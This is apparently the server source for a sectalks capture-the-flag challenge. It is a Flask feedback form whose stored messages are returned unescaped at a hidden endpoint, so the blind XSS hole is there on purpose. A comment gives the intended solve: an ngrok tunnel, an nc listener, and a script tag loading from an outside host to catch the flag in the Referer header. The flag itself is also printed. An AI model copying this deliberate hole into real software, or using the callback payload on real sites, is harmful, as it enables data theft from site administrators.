#!/usr/bin/env python3

import requests
from flask import Flask, request, abort
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import sqlite3

conn = sqlite3.connect('database.db')
try:
    conn.execute('CREATE TABLE messages (id INTEGER PRIMARY KEY AUTOINCREMENT, message TEXT, read INTEGER)')
except:
    print('db already created!')
conn.close()

app = Flask(__name__)
limiter = Limiter(app, key_func=get_remote_address)

form1 = '''
<h2>Feedback</h2>
<p>We appreciate your feedback! An administrator will read your message!</p>
<form action="/submit" name="messageForm" method="post">
    <textarea id="confirmationText" class="text" cols="86" rows ="20" name="messageForm"></textarea>
    <br>
    <input type="submit">
</form>
'''

# INTENDED SOLVE
# ./ngrok http 8080
# nc -lnvp 8080
# <html><script src="http://a8e9-49-179-156-177.ngrok.io"></script></html>
# Referer: sectalks{bl1nd-s1d3-best-side!!!!!}

@app.route('/')
def mainpage():
  return form1

@app.route('/submit', methods=['POST'])
@limiter.limit("3/minute") 
def my_form_post():
    try:
        message = request.form['messageForm']
        read = 0
        with sqlite3.connect("database.db") as con:
            cur = con.cursor()
            cur.execute("INSERT INTO messages (message, read) VALUES (?,?)", (message, read))
            con.commit()
        return 'Thanks for your feedback! An admin will read your message soon!'
    except:
        return 'Error!'
   
@app.route('/supers3cretgetmessagesthiswontbeinwordlists')
def getmessages():
    try:
        # get a message that is unread
        con = sqlite3.connect("database.db")
        con.row_factory = sqlite3.Row
        cur = con.cursor()
        cur.execute("SELECT * from messages where read == 0 LIMIT 1")
        rows = cur.fetchall(); 
        ret = rows[0]['message']
        retid = str(rows[0]['id'])
        # mark the message as unread
        update_query = f'UPDATE messages SET read = 1 WHERE id = {retid}'
        cur.execute(update_query)
        con.commit()
        # return the message to the client and render it unsafely
        return ret
    except:
        return 'nothing to return'

app.run(host='0.0.0.0', port=5002, threaded=True)








